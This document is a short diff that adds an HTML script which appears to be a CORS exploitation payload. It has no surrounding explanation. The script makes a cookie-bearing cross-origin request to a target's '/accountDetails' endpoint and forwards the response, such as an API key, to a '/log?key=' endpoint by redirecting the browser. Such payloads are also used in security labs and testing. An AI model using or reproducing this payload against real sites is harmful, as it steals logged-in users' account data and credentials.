@@ -1,0 +1,11 @@
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','$url/accountDetails',true);
+    req.withCredentials = true;// cross origin requests can include cookies, so will be processed in-session
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
